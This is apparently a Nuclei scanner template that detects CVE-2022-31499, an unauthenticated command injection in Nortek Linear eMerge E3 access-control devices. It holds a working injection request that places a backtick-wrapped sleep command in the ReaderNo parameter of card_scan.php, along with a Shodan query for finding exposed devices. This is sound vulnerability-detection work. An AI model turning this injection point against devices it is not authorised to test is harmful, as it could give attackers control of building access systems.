id: CVE-2022-31499
info:
  name: Nortek Linear eMerge E3-Series <0.32-08f - Remote Command Injection
  author: pikpikcu
  severity: critical
  description: Nortek Linear eMerge E3-Series devices before version 0.32-08f are
    vulnerable to remote command injection, allowing attackers to execute malware,
    obtain sensitive information, modify data, and gain full control over the system
    without credentials due to an incomplete fix.
  reference:
  - https://packetstormsecurity.com/files/167991/Nortek-Linear-eMerge-E3-Series-Command-Injection.html
  - https://github.com/omarhashem123/CVE-2022-31499
  - http://packetstormsecurity.com/files/167991/Nortek-Linear-eMerge-E3-Series-Command-Injection.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-31499
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-31499
    cwe-id: CWE-78
  metadata:
    shodan-query: title:"eMerge"
    verified: 'true'
    impact: The impact of CVE-2022-31499 on Nortek Linear eMerge E3-Series devices
      is that attackers can remotely inject commands to execute malware, access private
      data, alter information, and achieve complete control over the system without
      the need for authentication.
    recommendation: It is recommended that Nortek Linear eMerge E3-Series devices
      be updated to version 0.32-08f or higher to prevent remote command injection
      and potential compromise of sensitive information.
  tags: packetstorm,cve,cve2022,emerge,rce
requests:
- raw:
  - '@timeout: 15s

    GET /card_scan.php?No=123&ReaderNo=`sleep%207`&CardFormatNo=123 HTTP/1.1

    Host: {{Hostname}}

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=7
    - contains(all_headers, "text/html")
    - status_code == 200
    - contains(body, '{\"CardNo\":false')
    condition: and
